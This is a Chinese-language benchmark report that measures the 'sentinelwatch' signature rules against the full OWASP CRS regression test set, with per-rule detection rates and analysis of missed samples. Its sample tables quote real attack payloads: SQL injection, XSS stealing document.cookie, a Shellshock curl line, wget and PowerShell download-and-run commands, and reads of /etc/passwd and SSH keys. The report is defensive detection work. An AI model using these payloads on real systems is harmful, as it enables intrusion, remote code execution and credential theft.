# 外部基准：OWASP CRS 全量回归集 × sentinelwatch 规则

- 语料：`crs_regression.json`（coreruleset `97ccf35e8ae8`）
- 样本：**2,503** 条（该检出 1,940 / 「不该触发本规则」 563）
- 参与评测：27 条签名规则（另有 3 条窗口阈值规则不适用单样本评测）
- 生成：`python bench/run_crs_bench.py`

> 这份报告与 `crosscheck_bypasslab.md` **不可互换**：那边是自造语料 + 手抄的 59 条 CRS 子集，这边是 CRS 全量回归集。两边分母不同，数字不能相加，也不能直接比大小。

## 1. 总表：按类别

| 类别 | 该检出 | 检出 | 检出率 | 「不该触发本规则」 | 其中被我们命中 |
|---|---:|---:|---:|---:|---:|
| `sqli` | 871 | 177 | 20.3% | 163 | 5 |
| `rce` | 793 | 79 | 10.0% | 330 | 17 |
| `xss` | 209 | 42 | 20.1% | 54 | 2 |
| `path-traversal` | 67 | 15 | 22.4% | 16 | 1 |
| **合计** | **1,940** | **313** | **16.1%** | **563** | **25** |

**检出率 16.1%**，分母 1,940 条。

这个数字比手抄 59 条时的 54.2% 难看得多，而**难看才是对的**：那 59 条挑的是四个方法文件（`942100`/`941100`/`930100`/`932130`），都是 libinjection 那几条「形状最接近正则」的规则。全量里有 148 个规则文件，包含大量靠解析层能力（`REQUEST_METHOD`、XML 解析、`%uXXXX` best-fit、字符频率计分）判定的样本，本项目只做请求文本上的签名匹配。**扩样本量不是为了让数字变好，是为了让数字可信。**

## 2. 两种口径：签名型 vs CRS 全量

CRS 的 `942430`/`942431`/`942432`（*Restricted SQL Character Anomaly Detection*）按**字符频率计分**判定——打一个 `'` 或 `;` 就算可疑。复现它得引入 paranoia level + 阈值模型，会改掉整个引擎的性格。

| 口径 | 分母 | 检出 | 检出率 |
|---|---:|---:|---:|
| CRS 全量（含异常字符族） | 1,940 | 313 | **16.1%** |
| 仅签名型（排除 `94243x`） | 1,921 | 309 | **16.1%** |

两者只差 0.0 个百分点——**说明差距不在那三条异常字符规则上**。这是一个有用的否证：原本很容易把「16%」归咎于「我们不做计分模型」，数据说不是。

## 3. 逐规则：148 个 CRS 规则文件，哪些覆盖了、哪些没有

这是这份语料真正的价值：**从「一个百分比」变成「一张分布图」**。百分比只能说明整体水平，逐规则表能说明「差在哪种判据上」。

### 3.1 最弱的 18 个规则族（样本数 ≥ 3）

| CRS 规则 | 类别 | 性质 | 样本 | 检出 | 检出率 |
|---|---|---|---:|---:|---:|
| `932140` | rce | signature | 154 | 0 | 0% |
| `942120` | sqli | signature | 42 | 0 | 0% |
| `932270` | rce | signature | 24 | 0 | 0% |
| `942490` | sqli | signature | 23 | 0 | 0% |
| `932237` | rce | signature | 23 | 0 | 0% |
| `942520` | sqli | signature | 19 | 0 | 0% |
| `930140` | path-traversal | signature | 18 | 0 | 0% |
| `932380` | rce | signature | 18 | 0 | 0% |
| `932240` | rce | signature | 17 | 0 | 0% |
| `942521` | sqli | signature | 15 | 0 | 0% |
| `932175` | rce | signature | 15 | 0 | 0% |
| `932340` | rce | signature | 15 | 0 | 0% |
| `932390` | rce | signature | 15 | 0 | 0% |
| `941390` | xss | signature | 12 | 0 | 0% |
| `942240` | sqli | signature | 12 | 0 | 0% |
| `942370` | sqli | signature | 12 | 0 | 0% |
| `942470` | sqli | signature | 12 | 0 | 0% |
| `932238` | rce | signature | 12 | 0 | 0% |

### 3.2 完全零命中的规则族：**87 / 148**

这些是「CRS 能抓、我们一条抓不到」的规则族。列出来而不是藏起来——它们就是下一步该补什么的最直接线索。

| CRS 规则 | 类别 | 样本数 |
|---|---|---:|
| `930140` | path-traversal | 18 |
| `930121` | path-traversal | 10 |
| `932140` | rce | 154 |
| `932270` | rce | 24 |
| `932237` | rce | 23 |
| `932380` | rce | 18 |
| `932240` | rce | 17 |
| `932175` | rce | 15 |
| `932340` | rce | 15 |
| `932390` | rce | 15 |
| `932238` | rce | 12 |
| `932290` | rce | 9 |
| `932311` | rce | 9 |
| `932210` | rce | 8 |
| `932232` | rce | 8 |
| `932280` | rce | 8 |
| `932281` | rce | 8 |
| `932120` | rce | 7 |
| `932190` | rce | 7 |
| `932300` | rce | 7 |
| `932320` | rce | 7 |
| `932310` | rce | 6 |
| `932301` | rce | 5 |
| `932331` | rce | 4 |
| … | | 另 63 个 |

### 3.3 覆盖最好的 10 个规则族

| CRS 规则 | 类别 | 样本 | 检出 | 检出率 |
|---|---|---:|---:|---:|
| `930100` | path-traversal | 5 | 5 | 100% |
| `942160` | sqli | 26 | 26 | 100% |
| `942270` | sqli | 3 | 3 | 100% |
| `942310` | sqli | 3 | 3 | 100% |
| `942100` | sqli | 17 | 16 | 94% |
| `932220` | rce | 13 | 10 | 77% |
| `942170` | sqli | 4 | 3 | 75% |
| `942350` | sqli | 8 | 6 | 75% |
| `942150` | sqli | 20 | 14 | 70% |
| `941101` | xss | 3 | 2 | 67% |

## 4. 「不该触发本规则」的 563 条：我们命中了 25 条

**这个数字不是误报率。** CRS 的 `no_expect_ids` 是规则维度的期望，含义有三种，混在同一批样本里。分桶之后信号才清楚：

| 分桶 | `desc` 的写法 | 含义 | 样本 | 我们命中 |
|---|---|---|---:|---:|
| `explicit` | `NEGATIVE:` / `Don't match` | **这条本就不该匹配**。命中它 = 判据过宽 | 438 | 8 |
| `known_fp` | `Known false positive` | **这条看着就是攻击**、CRS 为控误报故意放过。命中它 = 我们更激进 | 3 | 2 |
| `unclassified` | 其它自由文本 | 多为攻击描述（别的规则该抓）或上下文说明 | 108 | 15 |
| `undocumented` | 没写 `desc` | 无从判断 | 14 | 0 |

把两个桶分开是**必需**的，因为它们的含义相反：

- `explicit` 桶命中 **8** 条，这才是「判据可能过宽」的信号，要逐条看；
- `known_fp` 桶命中 **2** 条，方向相反——`desc` 写着 `Known false positive` 的样本本身就是攻击（比如 `'||(select(pg_sleep(15))where(true))||'`），CRS 为了控误报故意放过，我们抓了。**这不是错，是取舍不同。**

第一版把这两个桶混成一个「反例」桶，得到的结论是「误报 25 条、4.44%」——**一个方向都指反了的指标**。

命中的样本（最多 20 条，供逐条判断）：

| 样本 | 桶 | CRS 规则 | 命中的我们的规则 | `desc` | 载荷 |
|---|---|---|---|---|---|
| `CRS-930110-5` | unclassified | `930110` | `http-path-traversal-obfuscated` | Path Traversal Attack (/../) query stri… | `/get/foo.../1234` |
| `CRS-941100-5` | unclassified | `941100` | `http-xss-script-injection` | XSS testing of libinjection in User-Age… | `/get` |
| `CRS-941140-14` | unclassified | `941140` | `http-xss-script-injection` | url(javascript without a name= assignme… | `test=url%28javascript%3Aalert%281%29%29` |
| `CRS-942160-12` | explicit | `942160` | `http-sqli-time-based` | Detect blind SQLi attack in REQUEST_FIL… | `/BENChmARk(2999/**/999,Md5(/` |
| `CRS-942360-30` | known_fp | `942360` | `http-sqli-time-based` | GH issue 1816 - Known false positive | `'\|\|(select(pg_sleep(15))where(true))\|\|'/i…` |
| `CRS-942360-31` | known_fp | `942360` | `http-sqli-union-select` | GH issue 1816 - Known false positive | `UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qqk…` |
| `CRS-942521-16` | explicit | `942521` | `http-sqli-boolean-blind` | Negative test: Wikipedia article about … | `var=Incorrectly%20constructed%20SQL%20stateme…` |
| `CRS-942522-8` | explicit | `942522` | `http-sqli-boolean-blind` | Negative test: Wikipedia article about … | `var=Incorrectly%20constructed%20SQL%20stateme…` |
| `CRS-932207-4` | unclassified | `932207` | `http-command-injection` | Referer header with query string and ob… | `/get` |
| `CRS-932230-1` | unclassified | `932230` | `http-command-injection` | System Command Injection (932230) from … | `foo=system('echo%20cd%20/tmp;wget%20http://tu…` |
| `CRS-932230-2` | unclassified | `932230` | `http-command-injection` | System Command Injection (932230) from … | `foo=http://ricky.ilmerlodellarocca.com/upload…` |
| `CRS-932230-9` | unclassified | `932230` | `http-command-injection` | Positive test - RCE passed in one of th… | `arg1=Something+else+2+%26%238222%3BThe+Title%…` |
| `CRS-932230-10` | unclassified | `932230` | `http-command-injection` | RCE from test 932230.yaml combined with… | `arg=system('echo%20cd%20/tmp;wget%20http://tu…` |
| `CRS-932230-11` | unclassified | `932230` | `http-command-injection` | RCE from test 932230.yaml combined with… | `arg=Something+%26%238222%3BThe+Title%26%23822…` |
| `CRS-932230-12` | unclassified | `932230` | `http-command-injection` | RCE from test 932230.yaml combined with… | `arg=system('echo%20cd%20/tmp;wget%20http://tu…` |
| `CRS-932230-14` | unclassified | `932230` | `http-command-injection`, `http-path-traversal` | RCE from https://github.com/payloadbox/… | `arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/…` |
| `CRS-932230-15` | unclassified | `932230` | `http-path-traversal` | RCE from https://github.com/payloadbox/… | `arg=%0Acat%20/etc/passwd;&arg2=Something+%26%…` |
| `CRS-932230-16` | unclassified | `932230` | `http-command-injection` | RCE from https://github.com/payloadbox/… | `arg=()%20{%20:;};%20/bin/bash%20-c%20"curl%20…` |
| `CRS-932230-18` | explicit | `932230` | `http-command-injection`, `http-path-traversal` | Like rule True Negative Rule Integrity … | `arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/…` |
| `CRS-932230-19` | explicit | `932230` | `http-command-injection`, `http-path-traversal` | Like rule True Negative Rule Integrity … | `arg=Something+%26%238222%3BThe+Title%26%23822…` |

## 5. 漏检归因：1627 条漏在哪，按 CRS 规则族排序

这是把 16.1% 从「一个数字」变成「一个可解释的现象」的那一步。归因不靠猜载荷特征——第一版那么试过，**89.9% 归不进任何桶**，因为真正的规律在规则编号上：`930120` 判「是否提到敏感文件名」，与载荷长什么样无关。所以直接按上游 `msg` 归类。

漏检合计 **1,627** 条，分布在前 143 个规则族上。下表按漏检条数排序：

| CRS 规则 | 类别 | CRS 侧判据（上游 `msg`） | 该族样本 | 漏检 | 占总漏检 |
|---|---|---|---:|---:|---:|
| `932140` | rce | Remote Command Execution: Windows FOR/IF Command Fo… | 154 | 154 | 9.5% |
| `942210` | sqli | Detects chained SQL injection attempts 1/2 | 77 | 73 | 4.5% |
| `942410` | sqli | SQL Injection Attack | 69 | 68 | 4.2% |
| `932236` | rce | Remote Command Execution: Unix Command Injection (c… | 85 | 67 | 4.1% |
| `942151` | sqli | SQL Injection Attack: SQL function name detected | 62 | 48 | 3.0% |
| `942550` | sqli | JSON-Based SQL Injection | 48 | 46 | 2.8% |
| `932235` | rce | Remote Command Execution: Unix Command Injection (c… | 45 | 44 | 2.7% |
| `942120` | sqli | SQL Injection Attack: SQL Operator Detected | 42 | 42 | 2.6% |
| `932239` | rce | Remote Command Execution: Unix Command Injection fo… | 39 | 32 | 2.0% |
| `942190` | sqli | Detects SQL code execution and information gatherin… | 43 | 30 | 1.8% |
| `942380` | sqli | SQL Injection Attack | 46 | 30 | 1.8% |
| `942362` | sqli | Detects concatenated basic SQL injection and SQLLFI… | 32 | 29 | 1.8% |
| `932130` | rce | Remote Command Execution: Unix Shell Expression Fou… | 36 | 28 | 1.7% |
| `932260` | rce | Remote Command Execution: Direct Unix Command Execu… | 29 | 27 | 1.7% |
| `942390` | sqli | SQL Injection Attack using (X)OR | 26 | 25 | 1.5% |

**前 15 个规则族占了 743/1,627 = 45.7% 的漏检**，其余 130 多个规则族各自只有个位数。这条分布说明：差距不是「整体判据都松」，而是**集中在少数几个我们根本没做的检测方向上**。

### 5.1 三组规则族造成了 41% 的漏检

按上游 `msg` 的字面语义分组（`command without evasion` / `SQL function name detected` / `SQL Operator Detected` / `Windows FOR/IF`）：

| 组 | 规则族 | 该组样本 | 漏检 | 占总漏检 |
|---|---|---:|---:|---:|
| Unix 命令词检测 | `932235`、`932236`、`932239`、`932260` | 198 | 170 | 10.4% |
| SQL 词法 / 算子检测 | `942120`、`942151`、`942190`、`942210`、`942362`、`942380`、`942390`、`942410` | 397 | 345 | 21.2% |
| Windows batch 语法 | `932140` | 154 | 154 | 9.5% |
| **合计** | | **749** | **669** | **41.1%** |

前两组描述的是同一件事：

> **CRS 判「出现了危险词」，本项目判「出现了注入语法结构」。**

`foo=cat /etc/passwd` 在 CRS 侧命中 `932236`（参数里出现了命令词）；在本项目侧不命中，因为我们的命令注入判据要求**四个语法位置**之一（`$(cmd)` / 反引号 / `;` `&&` `||` + 命令名 + 命令上下文 / 单管道 + 参数）。SQL 侧同理：`pay=RegExp`、`var2=LIKE NULL` 是 CRS `942120`「算子检测」的菜，我们的判据要求出现 `union select`、布尔盲注比较、报错函数这类**语法结构**。

这不是新发现，是 v2.1 那条「判据要描述形状、不要枚举写法」的**账单**：收紧形状换来了 CIC 真实流量上的 4/150,262 误报，代价就是在 token 级样本上大量漏检。**两份数字必须一起看**——只看这一份会得出「引擎很弱」，只看 CIC 会得出「引擎很准」，两个结论都是片面的。

第三组是纯粹的覆盖面问题：命令注入判据按 Unix shell 写，Windows batch 的 `FOR`/`IF` 是另一套语法，`932140` 的 154 条样本**一条都没考虑过**。

### 5.2 其余缺口：解析层与编码层

| CRS 规则 | 上游 `msg` | 漏检 | 缺口性质 |
|---|---|---:|---|
| `942550` | JSON-Based SQL Injection | 46 | JSON 结构化载体——本项目只读请求文本，不解析 JSON |
| `932130` | Remote Command Execution: Unix Shell Expressi… | 28 | 这一类**我们做了**（36 条样本检出 8）：漏的是方括号 glob、`${IFS}`、`$[2+2]` 这些 shell 词法特性，是 v2.1 写明的已知边界 |

## 6. 漏检抽样：每类最典型的 8 条

### `path-traversal`

| 样本 | CRS 规则 | 请求 | 载荷 |
|---|---|---|---|
| `CRS-930110-8` | `930110` | GET `/get` | `arg=..\pineapple` |
| `CRS-930110-10` | `930110` | POST `/post` | `------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition…` |
| `CRS-930110-11` | `930110` | POST `/post` | `------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition…` |
| `CRS-930110-12` | `930110` | GET `/get` | `a=..;.\.;\.` |
| `CRS-930120-4` | `930120` | GET `/get` | `foo=arg&path_comp=.ssh/id_rsa` |
| `CRS-930120-5` | `930120` | GET `/get` | `/sys/class=test` |
| `CRS-930120-6` | `930120` | GET `/get` | `test=/sys/class` |
| `CRS-930120-7` | `930120` | GET `/get` | `code=cat+%2Fetc%2Fsubuid` |

### `rce`

| 样本 | CRS 规则 | 请求 | 载荷 |
|---|---|---|---|
| `CRS-932120-1` | `932120` | GET `/get` | `932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1` |
| `CRS-932120-2` | `932120` | POST `/post` | `932120-2=Invoke-WebRequest http://example.com/path/file.ps1` |
| `CRS-932120-3` | `932120` | GET `/get` | `/get` |
| `CRS-932120-5` | `932120` | POST `/post` | `cmd=powershell%20C%3A%5Cwindows%5Csystem32%5Cnotepad.exe` |
| `CRS-932120-6` | `932120` | POST `/post` | `<?xml version="1.0"?><root><a probe="Invoke-WebRequest http:/…` |
| `CRS-932120-11` | `932120` | POST `/post` | `a=Remove-Item` |
| `CRS-932120-12` | `932120` | POST `/post` | `a=Invoke-Expression` |
| `CRS-932125-1` | `932125` | GET `/get` | `cmd=%3Biwr%20http://example.com/path/file.ps1` |

### `sqli`

| 样本 | CRS 规则 | 请求 | 载荷 |
|---|---|---|---|
| `CRS-942100-13` | `942100` | POST `/post` | `var=" \| type %SystemDrive%\\config.ini \| "` |
| `CRS-942101-7` | `942101` | POST `/post/foo/24'union+all+se…` | `/post/foo/24'union+all+select+1,2,3+from+aa` |
| `CRS-942101-8` | `942101` | POST `/post/foo/24'union+all+se…` | `/post/foo/24'union+all+select+1,2,3+from+aa/bar` |
| `CRS-942101-9` | `942101` | POST `/post/%2A/%2A/2+union+all…` | `/post/%2A/%2A/2+union+all/bar` |
| `CRS-942120-1` | `942120` | GET `/get` | `var=blahblah&var2=LIKE%20NULL` |
| `CRS-942120-2` | `942120` | POST `/post` | `pay=RegExp` |
| `CRS-942120-3` | `942120` | POST `/post` | `>>` |
| `CRS-942120-4` | `942120` | POST `/post` | `pay=%26%26` |

### `xss`

| 样本 | CRS 规则 | 请求 | 载荷 |
|---|---|---|---|
| `CRS-941100-6` | `941100` | POST `/post` | `foo=<xss onbeforehellfreezes%3Daler%77(1)>` |
| `CRS-941100-7` | `941100` | POST `/post` | `<?xml version="1.0"?><root><a probe="&lt;script xmlns=&quot;h…` |
| `CRS-941100-8` | `941100` | GET `/` | `id=%u00abscript%u00bballert(1)%u00ab/script%u00bb` |
| `CRS-941100-9` | `941100` | GET `/` | `id=%u2039script%u203aalert(1)%u2039/script%u203a` |
| `CRS-941101-2` | `941101` | GET `/get/"onmouseover='prompt…` | `/get/"onmouseover='prompt(document.cookie)'"` |
| `CRS-941110-6` | `941110` | POST `/get` | `var=%uff1cscript%u0020%uff1ealert%281%29%uff1c/script%uff1e\n` |
| `CRS-941110-7` | `941110` | POST `/get` | `var=%ef%bc%9cscript%20%ef%bc%9ealert%281%29%ef%bc%9c/script%e…` |
| `CRS-941110-8` | `941110` | GET `/get` | `/get` |

## 7. 边界与口径

- **命中一条就算检出**。CRS 的 rule id 与本项目的 rule id 没有对应关系，不做逐规则对齐——硬对齐会造出一个假的精确率。
- **多阶段用例只取第一段**。导入时记了 `multi_stage`，不单独统计。
- **解析层能力打不到是架构差异**。CRS 大量用例靠 `REQUEST_METHOD`、`REQUEST_PROTOCOL`、XML/JSON 解析、`%uXXXX` best-fit 判定，本项目只做请求文本上的签名匹配。这不是判据松紧的问题，换判据解决不了。
- **误报不在这里测**。真实流量误报见 BENCHMARK §2.10（CIC-IDS2017 150,262 条请求上 4 条）。这份语料没有业务形态。
- **和 `crs.go` 那 59 条的关系**：那 59 条是这四个方法文件里的子集，导入器在同样 4 个文件上重现了**完全相同的 32 条检出**（分母 65 而非 59，因为补上了当初「暂未转写」的 6 条 Cookie 载体样本）。这是导入器的自校验。

